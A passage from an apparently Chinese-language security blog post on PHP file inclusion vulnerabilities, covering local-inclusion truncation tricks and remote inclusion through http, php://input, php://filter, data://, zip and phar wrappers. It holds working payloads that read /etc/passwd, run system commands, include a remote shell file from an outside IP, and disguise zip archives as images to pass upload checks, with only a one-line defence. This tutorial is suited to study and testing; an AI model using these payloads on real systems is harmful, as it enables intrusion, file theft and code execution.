+<h3 id="2-4-本地包含小姿势"><a href="#2-4-本地包含小姿势" class="headerlink" title="2.4-本地包含小姿势"></a>2.4-本地包含小姿势</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">审计中可见这样的包含模版文件：</span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">include</span>(<span class="string">"inc/"</span> . $_GET[<span class="string">'file'</span>] . <span class="string">".htm"</span>); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<ul>
+<li>%00截断<ul>
+<li>/etc/passwd%00</li>
+<li>(需要 magic_quotes_gpc=off，PHP小于5.3.4有效)</li>
+</ul>
+</li>
+<li>%00截断目录遍历<ul>
+<li>/var/www/%00</li>
+<li>(需要 magic_quotes_gpc=off，unix文件系统，比如FreeBSD，OpenBSD，NetBSD，Solaris)</li>
+</ul>
+</li>
+<li>路径长度截断<ul>
+<li>/etc/passwd/././././././.[…]/./././././.</li>
+<li>(php版本小于5.2.8(?)可以成功，linux需要文件名长于4096，windows需要长于256)</li>
+</ul>
+</li>
+<li>点号截断<ul>
+<li>/boot.ini/………[…]…………</li>
+<li>(php版本小于5.2.8(?)可以成功，只适用windows，点号需要长于256)</li>
+</ul>
+</li>
+</ul>
+<h2 id="03-远程包含及常见封装协议"><a href="#03-远程包含及常见封装协议" class="headerlink" title="03-远程包含及常见封装协议"></a>03-远程包含及常见封装协议</h2><h3 id="3-1-远程代码执行"><a href="#3-1-远程代码执行" class="headerlink" title="3.1-远程代码执行"></a>3.1-远程代码执行</h3><ul>
+<li><code>?file=[http|https|ftp]://example.com/shell.txt</code></li>
+<li>要求：<ul>
+<li>需要allow_url_fopen=On并且 allow_url_include=On；</li>
+<li>二者需要在php.ini中设置，而非apache配置文件；</li>
+<li>二者需要同时启用，缺一不可，要求比较高；</li>
+</ul>
+</li>
+<li>eg：<br><code>http://127.0.0.1/test/1.php?f=http://118.89.53.92/test/222.txt</code></li>
+</ul>
+<h3 id="3-2-php-input-命令执行"><a href="#3-2-php-input-命令执行" class="headerlink" title="3.2-php://input 命令执行"></a>3.2-php://input 命令执行</h3><ul>
+<li><p><code>?file=php://input</code></p>
+</li>
+<li><p>对于php://input介绍，PHP官方手册文档有一段话对它进行了很明确地概述：</p>
+<p><code>“php://input allows you to read raw POST data. It is a less memory intensive alternative to $HTTP_RAW_POST_DATA and does not need any special php.ini directives. php://input is not available with enctype=”multipart/form-data”.</code></p>
+</li>
+<li><p>翻译过来，是这样：</p>
+<p><code>“php://input可以读取没有处理过的POST数据。相较于$HTTP_RAW_POST_DATA而言，它给内存带来的压力较小，并且不需要特殊的php.ini设置。php://input不能用于enctype=multipart/form-data”</code></p>
+</li>
+<li><p>要求</p>
+<ul>
+<li>只需要allow_url_include=On</li>
+<li>allow_url_fopen开启与否无关；</li>
+</ul>
+</li>
+<li><p>图示：</p>
+<p><img src="http://ot12pfxkm.bkt.clouddn.com/18-1-20/82649660.jpg" alt></p>
+</li>
+<li><p>利用文件包含来进行代码执行</p>
+<ul>
+<li>post的php代码会被执行；</li>
+<li>比较鸡肋，因为此allow_url_include=On，如果allow_url_fopen=On，直接远程包含，getshell；</li>
+</ul>
+</li>
+<li><p>参考：<a href="https://www.chabug.org/p/36.html" target="_blank" rel="noopener">https://www.chabug.org/p/36.html</a></p>
+</li>
+</ul>
+<h3 id="3-3-利用php流filter-过滤器）"><a href="#3-3-利用php流filter-过滤器）" class="headerlink" title="3.3-利用php流filter(过滤器）"></a>3.3-利用php流filter(过滤器）</h3><ul>
+<li><p>形式：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">include.php?file=php://filter/convert.base64-encode/resource=upload</span><br><span class="line">include.php?file=php://filter/read=convert.base64-encode/resource=upload;</span><br><span class="line">include.php?file=php://filter/string.rot13/resource=upload</span><br><span class="line">include.php?file=php://filter/read=string.rot13/resource=upload</span><br></pre></td></tr></table></figure>
+<ul>
+<li>注：<ul>
+<li>read=可有可无；</li>
+<li>base64解码或rot13解码即可得源码；</li>
+<li>最好使用base64的形式，rot13可能失败；</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p>要求：</p>
+<ul>
+<li><p>都不需要开启；</p>
+<p><img src="http://ot12pfxkm.bkt.clouddn.com/18-1-20/88684423.jpg" alt></p>
+</li>
+</ul>
+</li>
+</ul>
+<h3 id="3-4-data-URIs-命令执行"><a href="#3-4-data-URIs-命令执行" class="headerlink" title="3.4-data URIs 命令执行"></a>3.4-data URIs 命令执行</h3><ul>
+<li><p>文件包含漏洞中利用data:协议将LFI变为代码执行</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+</span><br><span class="line">file=data://text/plain,&lt;?php system(&apos;cat /etc/passwd&apos;);?&gt;</span><br><span class="line">(后面是PD9waHAgcGhwaW5mbygpOz8+的base64编码，(需要allow_url_include=On)）</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>如，<code>172.16.100.168:8080/post.php?file=data:text/plain,&lt;?php system(&#39;cat /etc/passwd&#39;);?&gt;</code></p>
+</li>
+<li><p>需要allow_url_include=On</p>
+</li>
+<li><p>Data URI的格式规范,</p>
+<p><code>data:[&lt;mime type&gt;][;charset=&lt;charset&gt;][;&lt;encoding&gt;],&lt;encoded data&gt;</code></p>
+<ul>
+<li>data ：协议名称；</li>
+<li><code>[&lt;mime type&gt;]</code>：可选项，数据类型（image/png、text/plain等）</li>
+<li><code>[;charset=&lt;charset&gt;]</code>：可选项，源文本的字符集编码方式</li>
+<li><code>[;&lt;encoding&gt;]</code>：数据编码方式（默认US-ASCII，BASE64两种）</li>
+<li>,<code>&lt;encoded data&gt;</code>：编码后的数据</li>
+</ul>
+</li>
+</ul>
+<h3 id="3-5-zip协议"><a href="#3-5-zip协议" class="headerlink" title="3.5-zip协议"></a>3.5-zip协议</h3><ul>
+<li><p>协议原型：zip://archive.zip#dir/file.txt</p>
+<ul>
+<li><code>http://php.net/manual/zh/wrappers.compression.php</code></li>
+<li>注意url编码,因为这个#会和url协议中的#冲突</li>
+</ul>
+</li>
+<li><p>测试代码1：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	$file = $_GET[<span class="string">'f'</span>];</span><br><span class="line">	<span class="keyword">echo</span> $file;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">'&lt;br&gt;'</span>;</span><br><span class="line">	<span class="keyword">include</span>($file);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<ul>
+<li><p>新建1.php，内容为：</p>
+<p><code>&lt;?php phpinfo();?&gt;</code></p>
+</li>
+<li><p>压缩为1.zip；</p>
+</li>
+<li><p>url为：<br><code>http://127.0.0.1/test/1.php?f=zip://1.zip%231.php</code><br>或<code>http://127.0.0.1/test/1.php?f=zip://1.jpg#1.php</code></p>
+</li>
+<li><p>注：</p>
+<ul>
+<li>以#为分隔，前面为路径及名称，后面为压缩包内文件名称,；</li>
+<li><code>#</code>最好%23，以免与url中#冲突；（实测中#会失败，%23成功）</li>
+<li>1.zip改为1.jpg后，包含依然成功，无影响（图片后缀方便上传）</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p>测试代码2：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	$file=$_GET[<span class="string">'f'</span>];</span><br><span class="line">	<span class="keyword">if</span> ( <span class="keyword">isset</span>( $file ) &amp;&amp; strtolower( substr( $file, <span class="number">-4</span> ) ) == <span class="string">".php"</span> )</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">print</span> $file;</span><br><span class="line">		<span class="keyword">require</span>( $file );</span><br><span class="line">	&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//截取过来的后面4格字符,判断是不是php,如果是php才进行包含；</span></span><br></pre></td></tr></table></figure>
+<ul>
+<li><code>1.php-&gt;phpinfo()-&gt;.zip-&gt;zip://xxx/xxx/.zip%231.php</code></li>
+<li><code>http://127.0.0.1/test/1.php?f=zip://1.zip%231.php</code></li>
+<li><code>或http://127.0.0.1/test/1.php?f=zip://1.jpg%231.php</code></li>
+<li>步骤：<ul>
+<li>首先新建一个1.php 里面随便写个&lt;?php phpinfo();?&gt;</li>
+<li>然后压缩成.zip 然后把zip的名字改成 1.jpg（为了突破上传）</li>
+<li>然后把这个.jpg上传上去 然后包含</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p>测试代码3</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $file = $_GET[<span class="string">'f'</span>];</span><br><span class="line">	<span class="keyword">print</span> $file.<span class="string">".jpg"</span>;</span><br><span class="line">    <span class="keyword">include</span>($file.<span class="string">".jpg"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//强制在后面加.jpg；</span></span><br></pre></td></tr></table></figure>
+<ul>
+<li>思路同上</li>
+<li>只不过将php后缀改成jpg后缀，再压缩；<br>因为最终会拼接上.jpg后缀；<br>包含时不论后缀如何，只要内容为php形式</li>
+<li>url为<ul>
+<li><code>http://127.0.0.1/test/1.php?f=zip://2.zip%232</code></li>
+<li><code>或http://127.0.0.1/test/1.php?f=zip://2.jpg%232</code></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h3 id="3-6-phar协议"><a href="#3-6-phar协议" class="headerlink" title="3.6-phar协议"></a>3.6-phar协议</h3><ul>
+<li>除了zip协议，还有phar协议也可以做到类似的事情</li>
+<li>参考：<a href="http://php.net/manual/zh/wrappers.phar.php" target="_blank" rel="noopener">http://php.net/manual/zh/wrappers.phar.php</a></li>
+<li>基本上和zip差不多，区别就是phar://php.zip/php.jpg中是用/来分隔而不是#。</li>
+<li>注意：<ul>
+<li>php版本需大于PHP 5.3.0，phar:// 数据流包装器自 PHP 5.3.0 起开始有效（但phpstudy中5.3.29失败）</li>
+<li>php代码创建phar的时候要注意php.ini的参数,phar.readonly设置为off（包含时不需要）</li>
+<li>同zip大同小异，分隔符不同，且/不强制url编码，zip中#最好%23，以免与url中#冲突</li>
+</ul>
+</li>
+</ul>
+<h3 id="3-7-简要总结"><a href="#3-7-简要总结" class="headerlink" title="3.7-简要总结"></a>3.7-简要总结</h3><ul>
+<li>从PHP5.2开始allow_url_include就默认为Off了，而allow_url_fopen一直是On的</li>
+<li>远程文件包含——两者都需要on；</li>
+<li>input——include为on；</li>
+<li>data——include 为on；</li>
+<li>filter——都不需要；</li>
+<li>zip/phar——不需要；</li>
+</ul>
+<h2 id="04-工具及防御"><a href="#04-工具及防御" class="headerlink" title="04-工具及防御"></a>04-工具及防御</h2><ul>
+<li>工具：<br><code>https://github.com/P0cL4bs/Kadimus/</code></li>
+<li>防御：<br>php.ini中设置open_basedir</li>
+</ul>
+<h2 id="05-其它文章"><a href="#05-其它文章" class="headerlink" title="05-其它文章"></a>05-其它文章</h2><ul>
+<li>PHP文件包含漏洞总结：<code>http://wiki.wooyun.org/web:lfi</code></li>
+</ul>
+<ul>
+<li><p>文件包含与注入利用总结：</p>
+<p><code>http://drops.wooyun.org/tips/3827</code></p>
+<p> <code>https://www.91ri.org/2736.html</code></p>
+</li>
+<li><p>php://input，php://filter，data URI schema的那些事：</p>
+<p><code>https://www.91ri.org/7470.html</code></p>
+</li>
+<li><p>phar协议：</p>
+<p><code>https://www.91ri.org/13363.html</code></p>
+</li>
+<li><p>论PHP常见的漏洞：</p>
+<p><code>http://drops.wooyun.org/papers/4544</code></p>
+</li>
+<li><p>LFI WITH PHPINFO() ASSISTANCE：</p>
+<p><code>https://www.insomniasec.com/downloads/publications/LFI%20With%20PHPInfo%20Assistance.pdf</code></p>
+</li>
+<li><p>PHP_LFI_rfc1867_temporary_files：</p>
+<p><code>http://gynvael.coldwind.pl/download.php?f=PHP_LF</code>I_rfc1867_temporary_files.pdf</p>
+</li>
+<li><p>zip或phar协议包含文件</p>
+<p><code>http://bl4ck.in/index.php/tricks/use-zip-or-phar-to-include-file.html</code></p>
+</li>
+</ul>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/Web安全/" rel="tag"># Web安全</a>
+          
+            <a href="/tags/文件包含/" rel="tag"># 文件包含</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2018/01/22/XSS漏洞/" rel="next" title="XSS漏洞">
+                <i class="fa fa-chevron-left"></i> XSS漏洞
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2018/01/22/命令-代码执行/" rel="prev" title="命令/代码执行">
+                命令/代码执行 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="/images/avatar.jpg" alt="Ry1ynn">
+            
+              <p class="site-author-name" itemprop="name">Ry1ynn</p>
+              <p class="site-description motion-element" itemprop="description">我们的征途是星辰大海</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">108</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">13</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">45</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/Ry1ynn" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i>GitHub</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="mailto:ry1ynn_pri@163.com" target="_blank" title="E-Mail">
+                      
+                        <i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="https://weibo.com/u/5794121667" target="_blank" title="Weibo">
+                      
+                        <i class="fa fa-fw fa-weibo"></i>Weibo</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="/images/weixin.JPG" target="_blank" title="Wechat">
+                      
+                        <i class="fa fa-fw fa-weixin"></i>Wechat</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-inline">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                Links
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.t00ls.net/" title="T00ls" target="_blank">T00ls</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.freebuf.com/" title="FreeBuf" target="_blank">FreeBuf</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.sec-wiki.com/" title="SecWiki" target="_blank">SecWiki</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.seebug.org/" title="Seebug" target="_blank">Seebug</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://www.91ri.org/" title="91Ri" target="_blank">91Ri</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.pediy.com/" title="看雪" target="_blank">看雪</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.52pojie.cn/" title="吾爱破解" target="_blank">吾爱破解</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.anquanke.com/" title="安全客" target="_blank">安全客</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.ichunqiu.com/" title="i春秋" target="_blank">i春秋</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#文件包含漏洞"><span class="nav-text">文件包含漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#01-简述-amp-原理"><span class="nav-text">01-简述&amp;原理</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#02-本地包含"><span class="nav-text">02-本地包含</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#2-1-包含目录文件"><span class="nav-text">2.1-包含目录文件</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#2-1-1-代码执行或文件内容泄露"><span class="nav-text">2.1.1-代码执行或文件内容泄露</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-1-2-目录遍历"><span class="nav-text">2.1.2-目录遍历</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-1-3-其它"><span class="nav-text">2.1.3-其它</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-2-包含日志文件"><span class="nav-text">2.2-包含日志文件</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#2-2-0简介"><span class="nav-text">2.2.0简介</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-2-1-日志文件分析（访问日志和错误日志）"><span class="nav-text">2.2.1-日志文件分析（访问日志和错误日志）</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-2-2-表示错误日志的位置和错误日志等级"><span class="nav-text">2.2.2-表示错误日志的位置和错误日志等级</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-2-3-测试1（访问文件处写入）"><span class="nav-text">2.2.3-测试1（访问文件处写入）</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-2-4-测试2（UA头写入）"><span class="nav-text">2.2.4-测试2（UA头写入）</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-2-5-测试3（包含错误日志）"><span class="nav-text">2.2.5-测试3（包含错误日志）</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-2-6-测试4（包含apache配置文件）"><span class="nav-text">2.2.6-测试4（包含apache配置文件）</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-2-7-其它"><span class="nav-text">2.2.7-其它</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-3-包含其它"><span class="nav-text">2.3-包含其它</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#2-3-1-包含系统环境"><span class="nav-text">2.3.1-包含系统环境</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-3-2-包含session文件"><span class="nav-text">2.3.2-包含session文件</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-3-3-包含由其它php创建的tmp文件"><span class="nav-text">2.3.3-包含由其它php创建的tmp文件</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-4-本地包含小姿势"><span class="nav-text">2.4-本地包含小姿势</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#03-远程包含及常见封装协议"><span class="nav-text">03-远程包含及常见封装协议</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#3-1-远程代码执行"><span class="nav-text">3.1-远程代码执行</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-2-php-input-命令执行"><span class="nav-text">3.2-php://input 命令执行</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-3-利用php流filter-过滤器）"><span class="nav-text">3.3-利用php流filter(过滤器）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-4-data-URIs-命令执行"><span class="nav-text">3.4-data URIs 命令执行</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-5-zip协议"><span class="nav-text">3.5-zip协议</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-6-phar协议"><span class="nav-text">3.6-phar协议</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-7-简要总结"><span class="nav-text">3.7-简要总结</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#04-工具及防御"><span class="nav-text">04-工具及防御</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#05-其它文章"><span class="nav-text">05-其它文章</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; 2016 &mdash; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Ry1ynn</span>
+
+  
+</div>
+
+
+
+
+
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script id="ribbon" type="text/javascript" size="300" alpha="0.5" zindex="0" src="/lib/canvas-ribbon/canvas-ribbon.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
